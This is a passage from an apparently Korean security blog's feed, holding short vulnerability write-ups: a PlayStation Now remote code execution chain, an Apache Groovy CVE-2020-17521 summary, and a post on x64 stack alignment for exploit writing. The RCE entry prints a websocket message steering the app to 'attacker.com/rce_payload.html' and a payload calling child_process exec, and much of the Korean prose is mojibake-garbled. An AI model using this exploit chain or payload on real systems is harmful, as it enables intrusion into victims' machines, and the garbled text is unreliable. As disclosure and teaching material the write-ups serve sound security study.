ë•Œì˜ Unix timestampì…ë‹ˆë‹¤. Http date í•´ë” ê°’ì„ ì´ìš©í•´ ìœ ì¶”ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</li></ul></li></ul><p>ìƒì„±ëœ ë§í¬ëŠ” 24ì‹œê°„ ë™ì•ˆ ìœ íš¨í•©ë‹ˆë‹¤. ê³µê°œëœ POCëŠ” ìœ„ì—ì„œ ì„¤ëª…í•œ ì„¸ ê°’ì„ ì´ìš©í•´ ë¸Œë£¨íŠ¸í¬ì‹± ê³µê²©ì„ ì‹œë„í•˜ë©° í‰ê·  1ì‹œê°„ ë‚´ì™¸ë¡œ ìœ íš¨í•œ ë§í¬ë¥¼ ì°¾ì•„ëƒ…ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>authentication bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Remote Code Execution in PlayStation Now</title>
    <link href="/2020/12/08/l0ch/2020-12-08/"/>
    <url>/2020/12/08/l0ch/2020-12-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/873614">RCE in PlayStation Now</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PlayStation Now â‰¤ 11.0.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ê²Œì„ ìŠ¤íŠ¸ë¦¬ë° ì„œë¹„ìŠ¤ PlayStation Nowì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.<br><br><br>PS Nowì˜ ì£¼ìš” êµ¬ì„±ìš”ì†Œë¡œëŠ” QASì™€ AGLì´ ìˆìŠµë‹ˆë‹¤. QASëŠ” Qt5 í”„ë ˆì„ì›Œí¬ë¡œ ê°œë°œëœ  <code>psnowlauncher.exe</code> ì‹¤í–‰íŒŒì¼ì´ë©° PS Nowì˜ ë©”ì¸ ì• í”Œë¦¬ì¼€ì´ì…˜ì…ë‹ˆë‹¤.  AGLì€ Electron ì‘ìš© í”„ë¡œê·¸ë¨ì´ë©° QASì— ì˜í•´ ì‹¤í–‰ë©ë‹ˆë‹¤. ì²˜ìŒ ë¡œë“œí•  í˜ì´ì§€ì˜ URLì„ ë§¤ê°œë³€ìˆ˜ë¡œ ë°›ì•„ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.<br><br><br><code>nodeIntegration</code>ì€ <code>Electron BrowserWindows</code>ì—ì„œ ì‹¤í–‰ë˜ëŠ” ê¸°ëŠ¥ìœ¼ë¡œ javascriptì—ì„œ Windows í”„ë¡œì„¸ìŠ¤ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê¸°ë³¸ê°’ì€ falseì§€ë§Œ AGLì—ì„œëŠ” trueë¡œ ì„¤ì •ë˜ì–´ ìˆìœ¼ë©°, AGLì€ ë¡œë“œí•˜ëŠ” URL ê²€ì¦ì„ í•˜ì§€ ì•Šì•„ í•´ì»¤ì˜ í˜ì´ë¡œë“œê°€ ë‹´ê¸´ URLì„ í†µí•´ javascriptì—ì„œ ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br><br><br>ì´ ì„ì˜ ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì€ QASì—ì„œ ì‹¤í–‰ë˜ëŠ” ë¡œì»¬ ì›¹ ì†Œì¼“ ì„œë²„ë¥¼ í†µí•´ ì›ê²©ìœ¼ë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì›¹ì‚¬ì´íŠ¸ê°€ ë‹¤ìŒ requestë¥¼ ë¡œì»¬ ì›¹ ì†Œì¼“ ì„œë²„ì— ë³´ë‚´ë©´ AGLì— ë¡œë“œëœ URLì„ QASì—ì„œ ì‹¤í–‰í•©ë‹ˆë‹¤.  </p><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;setUrl&quot;</span>,  <span class="hljs-attr">&quot;params&quot;</span>: &#123;    <span class="hljs-attr">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://normal_url.com&quot;</span>  &#125;,  <span class="hljs-attr">&quot;source&quot;</span>: <span class="hljs-string">&quot;AGL&quot;</span>,  <span class="hljs-attr">&quot;target&quot;</span>: <span class="hljs-string">&quot;QAS&quot;</span>&#125;</code></pre><p>ê·¸ëŸ¬ë‚˜ sourceì™€ targetì„ ë°”ê¿” URLì„ AGLì—ì„œ ë¡œë“œí•  ìˆ˜ ìˆë„ë¡ êµ¬ì„±í•˜ë©´ ì›ê²©ì—ì„œ AGLì´ ë¡œë“œí•  URLì„ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br><br><br>í”¼í•´ìì˜ ì»´í“¨í„°ì—ì„œ PS Nowì™€ QAS, ë¡œì»¬ ì›¹ ì†Œì¼“ì´ ì‹¤í–‰ ì¤‘ì¼ ê²½ìš° ì•„ë˜ì™€ ê°™ì€ ë°©ë²•ìœ¼ë¡œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><ol><li><p>ë¸Œë¼ìš°ì €ë¡œ í•´ì»¤ì˜ ì›¹ì‚¬ì´íŠ¸ì— ì ‘ì†í•©ë‹ˆë‹¤.</p></li><li><p>ì›¹ ì‚¬ì´íŠ¸ëŠ” í”¼í•´ì PCì˜ ì›¹ ì†Œì¼“ ì„œë²„ <code>ws://localhost:1235</code> ì— ì—°ê²°ë©ë‹ˆë‹¤.</p></li><li><p>ì›¹ì‚¬ì´íŠ¸ëŠ” ì›¹ ì†Œì¼“ ì„œë²„ì— ë‹¤ìŒê³¼ ê°™ì€ ë©”ì‹œì§€ë¥¼ ë³´ëƒ…ë‹ˆë‹¤. </p> <pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;command&quot;</span>:<span class="hljs-string">&quot;setUrl&quot;</span>,<span class="hljs-attr">&quot;params&quot;</span>:&#123;<span class="hljs-attr">&quot;url&quot;</span>:<span class="hljs-string">&quot;https://attacker.com/rce_payload.html&quot;</span>&#125;,<span class="hljs-attr">&quot;source&quot;</span>:<span class="hljs-string">&quot;QAS&quot;</span>,<span class="hljs-attr">&quot;target&quot;</span>:<span class="hljs-string">&quot;AGL&quot;</span>&#125;</code></pre></li><li><p>AGLì€ <code>https://attacker.com/rce_payload.html</code> ë¥¼ ë¡œë“œí•©ë‹ˆë‹¤. ì´ë•Œ <code>rce_payload.html</code>ì˜ javascript ì½”ë“œê°€ í”¼í•´ìì˜ PCì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤.</p> <pre><code class="hljs jsx"><span class="hljs-comment">// rce_payload.html</span>&lt;html&gt;    &lt;head&gt;        &lt;title&gt;PS Now RCE&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)            .exec(<span class="hljs-string">&#x27;calc&#x27;</span>)        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>playstation</tag>
      
      <tag>remote code execution</tag>
      
      <tag>playstation now</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-17521: Apache Groovy Information Disclosure</title>
    <link href="/2020/12/07/idioth/2020-12-07/"/>
    <url>/2020/12/07/idioth/2020-12-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2020/q4/183">https://seclists.org/oss-sec/2020/q4/183</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Unsupported Codehaus version of Groovy from 2.0 to 2.4.4.</li><li>Apache Groovy versions 2.4.4 to 2.4.20 2.5.0 to 2.5.13, 3.0.0 to 3.0.6, and 4.0.0-alpha-1.</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache Groovyì—ì„œ <code>createTempDir</code> methodë¡œ ì¸í•œ Local Privilege Escalationê³¼ Information Disclosureê°€ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ ìœ ë‹‰ìŠ¤ ê¸°ë°˜ ìš´ì˜ ì²´ì œì™€ Mac OSX, Windowsì˜ ì˜›ë‚  ë²„ì „ì´ ì˜í–¥ì„ ë°›ìŠµë‹ˆë‹¤. ì·¨ì•½ì ì— ë…¸ì¶œë˜ëŠ” ì¡°ê±´ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ul><li>ì˜í–¥ì„ ë°›ëŠ” ìš´ì˜ ì²´ì œì—ì„œ Groovy codeê°€ ë™ì‘</li><li>ë‹¤ë¥¸ ìœ ì €ê°€ Groovy codeì— ì ‘ê·¼í•  ìˆ˜ ìˆìŒ</li><li><code>createTempDir</code> extension methodë¥¼ í†µí•´ ì„ì‹œ ë””ë ‰í„°ë¦¬ê°€ ìƒì„±</li></ul><p>GroovyëŠ” ëª¨ë“  ìœ ì €ê°€ ê³µìœ í•  ìˆ˜ ìˆëŠ” OS ì„ì‹œ ë””ë ‰í„°ë¦¬ ë‚´ì— ì„ì‹œ ë””ë ‰í„°ë¦¬ë¥¼ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. Groovyì—ì„œ <code>createTempDir</code> methodë¥¼ ì‚¬ìš©í•˜ë©´ java stubì„ ìƒì„±í•  ë•Œ ì‚¬ìš©ë˜ê±°ë‚˜ user codeë¥¼ ëŒ€ì‹ í•˜ê¸° ìœ„í•œ ì„ì‹œ ë””ë ‰í„°ë¦¬ê°€ ìƒì„±ë©ë‹ˆë‹¤. Groovy user codeê°€ <code>createTempDir</code> methodë¥¼ ì‚¬ìš©í•˜ì—¬ ì„ì‹œ ë””ë ‰í„°ë¦¬ì— ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì½”ë“œë¥¼ ì €ì¥í•˜ë©´ Local Privilege Escalationì´ ê°€ëŠ¥í•˜ê³  ë¯¼ê°í•œ ì •ë³´ë¥¼ ì €ì¥í•˜ê¸° ìœ„í•´ ì„ì‹œ ë””ë ‰í„°ë¦¬ê°€ ì‚¬ìš©ëœë‹¤ë©´ ì •ë³´ê°€ ë…¸ì¶œë˜ê±°ë‚˜ ìˆ˜ì •ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì´ ìˆ˜ì •ëœ Groovy 2.5 ì´ìƒ ë²„ì „ê³¼ JDK 7 ì´ìƒì—ì„œ ì‹¤í–‰ë˜ëŠ” Groovy 2.4ì—ì„œëŠ” Groovy Codeë¥¼ ì‹¤í–‰í•˜ëŠ” ì‚¬ìš©ìë§Œ ì½ì„ ìˆ˜ ìˆëŠ” ë””ë ‰í„°ë¦¬ë¥¼ ìƒì„±í•˜ëŠ” ìƒˆë¡œìš´ JDK methodë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ ì´ ë°©ë²•ì€ Local Privilege Escalationì€ ë§‰ì„ ìˆ˜ ìˆì§€ë§Œ Information DisclosureëŠ” ë§‰ì„ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.</p><p>ì‹œìŠ¤í…œ í™˜ê²½ ë³€ìˆ˜ <code>java.io.tmpdir</code>ë¥¼ ì‹¤í–‰ ì¤‘ì¸ ì‚¬ìš©ìì˜ ê³ ìœ  ë””ë ‰í„°ë¦¬ë¡œ ì„¤ì •í•˜ë©´ ëª¨ë“  ìš´ì˜ ì²´ì œì™€ Groovy ë²„ì „ì—ì„œ ì·¨ì•½ì ì´ í•´ê²°ë©ë‹ˆë‹¤. í˜¹ì€ Groovy extension method ëŒ€ì‹  JDKì˜ <code>Files#createTempDirectory</code> methodë¥¼ ì‚¬ìš©í•˜ì—¬ ì·¨ì•½ì ì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>information disclosure</tag>
      
      <tag>idioth</tag>
      
      <tag>apache</tag>
      
      <tag>groovy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] x64 stack alignment</title>
    <link href="/2020/12/06/fabu1ous/x64-stack-alignment/"/>
    <url>/2020/12/06/fabu1ous/x64-stack-alignment/</url>
    
    <content type="html"><![CDATA[<h1 id="ë¨¸ë¦¿ë§"><a href="#ë¨¸ë¦¿ë§" class="headerlink" title="ë¨¸ë¦¿ë§"></a>ë¨¸ë¦¿ë§</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/1.png"></p><p>ë¹„ë°€ í”„ë¡œì íŠ¸( ì•„ì§ ë¹„ë°€, ì‰¿! ) ë•Œë¬¸ì— Ubuntu 20.04ì—ì„œ ëª‡ ê°€ì§€ í…ŒìŠ¤íŠ¸ë¥¼ í•˜ë‹¤ê°€ ì²˜ìŒ ë³´ëŠ” ì—ëŸ¬ì— ë‹¹í™©í–ˆìŠµë‹ˆë‹¤. <code>do_system+364: movaps</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì—ì„œ Segmentation Faultê°€ ë°œìƒí•˜ë”ë¼ê³ ìš”.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/2.png"></p><p>ì•Œì•„ë³´ë‹ˆê¹Œ Ubuntu 18.04ë¶€í„° <code>do_system()</code>ì— <code>movaps</code>ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ í•˜ë‚˜ ì¶”ê°€ëìŠµë‹ˆë‹¤. ì¡°ê¸ˆ ë’¤ì— ìì„¸íˆ ì„¤ëª…í•˜ê² ì§€ë§Œ, x64 ë¦¬ëˆ…ìŠ¤ì—ì„  16ë°”ì´íŠ¸ë¡œ stack alignmentë¥¼ ì§€ì¼œì•¼ í•©ë‹ˆë‹¤. stack alignmentê°€ ê¹¨ì ¸ìˆìœ¼ë©´ ì´ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‹¤í–‰í•˜ë‹¤ Segmentation Faultê°€ ëœ¹ë‹ˆë‹¤.</p><p>ì´ë†ˆ ë•Œë¬¸ì— 18.04 ì´ì „ ë²„ì „ì—ì„œ ìµìŠ¤ ë˜ëŠ” BOF ê³µê²©ì½”ë“œê°€ 18.04 ì´í›„ ë²„ì „ì—ì„œëŠ” ì‚¬ìš©í•  ìˆ˜ ì—†ëŠ” ê²½ìš°ë„ ìˆë‹¤ê³  í•©ë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/3.png"></p><p><em>æ•… Fabu1ousì˜ ë„¤ì´ë²„ ë¸”ë¡œê·¸ (2018.10 ~ 2019.12)</em></p><p>ì§€ê¸ˆê¹Œì§€ í‘¼ í¬ë„ˆë¸” ë¬¸ì œë§Œ ë°±ëª‡ ê°œì¯¤ ë˜ê³  ìˆ˜ì—†ì´ ë§ì€ <code>system(&quot;/bin/sh&quot;)</code>ì„ í˜¸ì¶œí•´ ë´¤ëŠ”ë° ì–´ì§¸ì„œ ì´ ì‚¬ì‹¤ì„ ì´ì œì•¼ ì•Œê²Œ ëœ ê±°ì§€?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/4.png"></p><p>ì‘ë…„(2019) í¬ë¦¬ìŠ¤ë§ˆìŠ¤ CTFì—ì„œ ë‹¨ìˆœ ROPë¬¸ì œë¥¼ ìµìŠ¤ ëª»í•´ì„œ í™”ë‚¬ë˜ ê¸°ì–µì´ ë¨¸ë¦¬ë¥¼ ìŠ¤ì¹˜ê³  ì§€ë‚˜ê°”ìŠµë‹ˆë‹¤. ë¶„ëª… ë¡œì»¬ì—ì„  ìµìŠ¤ê°€ ë˜ë˜ ê²Œ ë¦¬ëª¨íŠ¸ ìµìŠ¤ê°€ ì•ˆë¼ì„œ íŒ€ì›ì—ê²Œ ì½”ë“œë¥¼ ë„˜ê²¨ì£¼ê³  ë‹¤ë¥¸ ë¬¸ì œ ë³´ëŸ¬ ê°”ì—ˆì£ . ê·¸ë•Œ ëª» í’€ì—ˆë˜ ROPë¬¸ì œëŠ” solo_testë€ ë¬¸ì œì˜€ëŠ”ë° ê·¸ë•Œ ë¡œì»¬ í™˜ê²½ì´ ìš°ë¶„íˆ¬ 16.04ì˜€ìŠµë‹ˆë‹¤â€¦ í›„â€¦</p><p>ëŒ€íšŒ ëë‚˜ê³  ë°”ë¡œ ë©°ì¹  ë’¤ì— ì´ ì£¼ì œì— ëŒ€í•œ ë¼ì—…ì´ í•˜ë‚˜ ì˜¬ë¼ì™”ëŠ”ë° 1ë…„ì´ ì§€ë‚œ ì§€ê¸ˆì—ì„œì•¼ ì°¾ì•„ë³¸ ì œ ìì‹ ì´ ë„ˆë¬´ ë°‰ë„¤ìš”. ROPë¬¸ì œë¼ê³  ëŒ€ìˆ˜ë¡­ì§€ ì•Šê²Œ ê·¸ëƒ¥ ë„˜ê²¨ë²„ë¦° ê²ƒì— ë°˜ì„±í•˜ë©° ì§€ê¸ˆì´ë¼ë„ ê³µë¶€í•´ë´…ì‹œë‹¤.</p><blockquote><p>ëŠ¦ì—ˆë‹¤ê³  ìƒê°í•  ë•Œê°€ ì§„ì§œ ë„ˆë¬´ ëŠ¦ì—ˆë‹¤ -ë°•ëª…ìˆ˜-</p></blockquote><h1 id="x64-Stack-Alignment"><a href="#x64-Stack-Alignment" class="headerlink" title="x64 Stack Alignment"></a>x64 Stack Alignment</h1><p>stack alignmentëŠ” stackì˜ topì´ 16ì˜ ë°°ìˆ˜ë¡œ ìœ ì§€ëœ ìƒíƒœë©° ë©”ëª¨ë¦¬ì˜ access cycleì„ ìµœì†Œí•œìœ¼ë¡œ ì¤„ì´ê¸° ìœ„í•´ ì‚¬ìš©í•©ë‹ˆë‹¤. ( CSë¥¼ ê³µë¶€í•˜ë‹¤ê°€ â€œì™œ?â€ë¼ëŠ” ì§ˆë¬¸ì„ ë˜ì§€ë©´ ì‹­ì¤‘íŒ”êµ¬ â€œíš¨ìœ¨â€ì´ë¼ëŠ” ëŒ€ë‹µì´ ëŒì•„ì˜´, ë” ìì„¸í•œ ê±´ ì§ì ‘ ì°¾ì•„ë³´ì‹œê¸¸ ) ê·¸ë¦¬ê³  ì´ stack alignmentë¥¼ ìœ ì§€í•˜ê¸° ìœ„í•´ RSPì˜ ìœ„ì¹˜ê°€ ì •í•´ì§€ëŠ” ê·œì¹™ì´ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/5.png"></p><p>Linux 64 <a href="https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf">ABI</a>( Application binary interface )ì— ë”°ë¥´ë©´ í”„ë¡œê·¸ë¨ì˜ íë¦„( control )ì´ í•¨ìˆ˜ì˜ entryë¡œ ì˜®ê²¨ì§€ëŠ” ì‹œì ì—ì„  ìŠ¤íƒ í¬ì¸í„°(rsp)+8ì´ í•­ìƒ 16ì˜ ë°°ìˆ˜ì—¬ì•¼ í•©ë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/6.png"></p><p>ë°©ê¸ˆ ì „ì—” RSPë¥¼ 16ì˜ ë°°ìˆ˜ë¡œ ìœ ì§€í•˜ëŠ” ê²Œ stack alignmentë¼ í•´ë†“ê³  ê°‘ìê¸° RSP+8ì´ 16ì˜ ë°°ìˆ˜ë¼ë‹ˆ, ë­ë¼ëŠ” ê±°ì•¼?</p><p>ë¬´ìŠ¨ ì†Œë¦°ì§€ ëª¨ë¥´ê² ì£ ? ì„¤ëª…ì´ ë­ ê°™ì´ ì“°ì—¬ìˆì–´ì„œ ê·¸ë ‡ì§€ ì‚¬ì‹¤ ì•„ì£¼ ê°„ë‹¨í•©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-comment">// test.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello stack alignment\\n&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;hello();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><pre><code class="hljs bash">$ gcc -o <span class="hljs-built_in">test</span> test.c -no-pie$ gdb -q <span class="hljs-built_in">test</span></code></pre><p>ê°„ë‹¨í•œ ì˜ˆì œë¥¼ í†µí•´ í™•ì¸í•´ë´…ì‹œë‹¤. ë””ë²„ê¹…í•  ë•Œ ê±°ìŠ¬ë¦¬ë‹ˆ PIEëŠ” í•´ì œí•˜ê³  ì»´íŒŒì¼í•˜ì„¸ìš”. ì €ëŠ” Ubuntu 20.04ì™€ glibc-2.31ë¥¼ ì‚¬ìš©í–ˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/7.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/8.png"></p><pre><code class="hljs bash">pwndbg&gt; r</code></pre><p>ì •ìƒì ìœ¼ë¡œ í˜¸ì¶œëœ <code>main()</code> í•¨ìˆ˜ì˜ entry pointì…ë‹ˆë‹¤. ì•„ì§ í”„ë¡¤ë¡œê·¸ë¥¼ ì‹¤í–‰í•˜ê¸° ì „ì´ë‹ˆ RSP+8ì€ 16ì˜ ë°°ìˆ˜ê² ì£ ?</p><p>RSP : <code>0x7fffffffe038</code></p><p>RSP+8 : <code>0x7fffffffe040</code></p><p>ìœ„ ìŠ¤í¬ë¦°ìƒ·ì„ ë³´ë©´ RSP+8ì€ <code>0x7fffffffe040</code>ì´ë¯€ë¡œ 16ì˜ ë°°ìˆ˜ê°€ ë§ìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/9.png"></p><p>ê·¸ëŸ¼ ë‹¤ë“¤ ì•Œë‹¤ì‹œí”¼ call ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ stackì— return addressë¥¼ push í•˜ë‹ˆê¹Œ call ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‹¤í–‰í•˜ê¸° ì§ì „ì—” RSPê°€ 16ì˜ ë°°ìˆ˜ê² ì£ ?</p><p>RSP : <code>0x7fffffffe030</code></p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/10.png"></p><p>ê·¸ë¦¬ê³  í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸ì—ì„œ <code>push rbp</code>ë¥¼ í•˜ë‹ˆê¹Œ rbpëŠ” í•­ìƒ 16ì˜ ë°°ìˆ˜ê² ë„¤ìš”?</p><p>RSP : <code>0x7ffffffffdfe0</code></p><p>ëŒ€ì¶© ì •ë¦¬í•´ë³´ë©´ stack alignì„ ì§€í‚¤ë©´ì„œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” íë¦„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>call ì‹¤í–‰ ì§ì „ RSPëŠ” 16ì˜ ë°°ìˆ˜ ( stack align O )</li><li>í•¨ìˆ˜ì˜ entry pointì—ì„  RSP+8ì´ 16ì˜ ë°°ìˆ˜ ( stack align X )</li><li>í•¨ìˆ˜ì˜ í”„ë¡¤ë¡œê·¸ ì‹¤í–‰ í›„ RSPëŠ” 16ì˜ ë°°ìˆ˜ ( stack align O )</li><li>RBPëŠ” í•­ìƒ 16ì˜ ë°°ìˆ˜ ( stack align O )</li></ol><p>ì‚¬ì‹¤, í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ë•Œ 2ë²ˆ ê³¼ì •ì—ì„œ ì ì‹œ stack alignì´ ê¹¨ì§€ê³  3ë²ˆì—ì„œ ë‹¤ì‹œ stack alignì´ ë§ì¶°ì§‘ë‹ˆë‹¤. ì—¬ê¸°ì„œ 2ë²ˆë§Œ ë˜‘ ë–¼ì„œ â€œì´ ê²ƒë§Œ ì§€í‚¤ì‹œë©´ stack alignì…ë‹ˆë‹¤.â€ë¼ê³  ì„¤ëª…ì„ ì¨ë†”ì„œ í—·ê°ˆë¦¬ëŠ” ê²ë‹ˆë‹¤. ì´ë˜ë„ ì´í•´ ì•ˆ ë˜ì‹œë©´ 4ë²ˆë§Œ ê¸°ì–µí•˜ì„¸ìš”. 4ë²ˆë§Œ ì‹ ê²½ ì¨ì¤˜ë„ ê³µê²© ì½”ë“œë¥¼ ì§œëŠ”ë° ì•„ë¬´ ì§€ì¥ì´ ì—†ì„ ê²ë‹ˆë‹¤. ë” ìì„¸í•œ ì„¤ëª…ì€ ì¡°ê¸ˆ ì´ë”° í•˜ê² ìŠµë‹ˆë‹¤.</p><h1 id="MOVAPS"><a href="#MOVAPS" class="headerlink" title="MOVAPS"></a>MOVAPS</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/11.png"></p><p>ì´ ê·œì¹™ì„ ê¼­ ì§€ì¼œì•¼ í•˜ëŠ”ê°€? ë¬¼ë¡  ì•„ë‹™ë‹ˆë‹¤. ë°©ê¸ˆ ì „ì—ë„ ì„¤ëª…í–ˆë“¯ì´ ìœ ì—°í•˜ê²Œ ì–´ê²¼ë‹¤ê°€ ì§€ì¼°ë‹¤ê°€ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  stack alignmentëŠ” íš¨ìœ¨ì„ ë†’ì´ê¸° ìœ„í•´ ìœ ì§€í•œë‹¤ê³ ë„ ì„¤ëª…í–ˆë‹¤ì‹œí”¼ ì§€í‚¤ì§€ ì•Šì•„ë„ í”„ë¡œê·¸ë¨ì´ ë™ì‘í•˜ëŠ”ë° ì•„ë¬´ ë¬¸ì œì—†ìŠµë‹ˆë‹¤. ë‹¤ë§Œ íš¨ìœ¨ì´ ì¢€ ë–¨ì–´ì§ˆ ë¿â€¦ ë¬¼ë¡  ì˜ˆì™¸ê°€ ì¡´ì¬í•˜ëŠ”ë° ëª‡ëª‡ intel/AMD cpuì—ì„œ SSE instructionì„ ì‹¤í–‰í•  ë•Œ  stack alignmentê°€ ê¹¨ì ¸ìˆìœ¼ë©´ segmentation faultê°€ ë°œìƒí•©ë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/12.png"></p><p>ê·¸ë¦¬ê³  <a href="http://qcd.phys.cmu.edu/QCDcluster/intel/vtune/reference/vc181.htm">MOVAPS</a>ê°€ ë°”ë¡œ SSE intruction ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. XMM ë ˆì§€ìŠ¤í„°ë¼ë¦¬ í˜¹ì€ XMM ë ˆì§€ìŠ¤í„°ì™€ ë©”ëª¨ë¦¬ ì‚¬ì´ì—ì„œ double quadword( 16byte ) í¬ê¸°ì˜ ë°ì´í„°ë¥¼ ì˜®ê¸°ëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì¸ë°, ë©”ëª¨ë¦¬ì˜ align ì—¬ë¶€ë¥¼ ê°•ì œí•©ë‹ˆë‹¤.</p><pre><code class="hljs c">&lt;do_system+<span class="hljs-number">364</span>&gt; movaps xmmword ptr [rsp + <span class="hljs-number">0x50</span>], xmm0</code></pre><p>XMM ë ˆì§€ìŠ¤í„°ì™€ ë©”ëª¨ë¦¬ ì‚¬ì´ì—ì„œ ë°ì´í„°ë¥¼ ì˜®ê¸¸ ë•Œ, ë©”ëª¨ë¦¬ì˜ alignì´ ê¹¨ì ¸ìˆìœ¼ë©´ general protection( #GP / SIGSEGV ) faultë¥¼ ë°œìƒì‹œí‚µë‹ˆë‹¤. ê·¸ë¦¬ê³  Ubuntu 18.04ë¶€í„° ì´ movaps ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ <code>do_system()</code>ì„ í¬í•¨í•œ ì—¬ëŸ¬ ë©€í‹°ë¯¸ë””ì–´ ì˜¤í¼ë ˆì´ì…˜ì— ì¶”ê°€ë˜ì–´ exploitì„ ì‘ì„±í•  ë•Œ stack alignmentë¥¼ ì‹ ê²½ ì¨ì•¼ í•©ë‹ˆë‹¤.</p><h1 id="JMP-vs-CALL-vs-RET"><a href="#JMP-vs-CALL-vs-RET" class="headerlink" title="JMP vs CALL vs RET"></a>JMP vs CALL vs RET</h1><p>ê·¸ë˜ì„œ Exploitì´ë‘ stack alignì´ ê¹¨ì§€ëŠ” ê±°ë‘ ë¬´ìŠ¨ ìƒê´€ì¸ë°? ê·¸ë˜ì„œ ì™œ 16.04ì—ì„  ì‰˜ì„ ë„ìš°ë˜ ê³µê²© ì½”ë“œê°€ 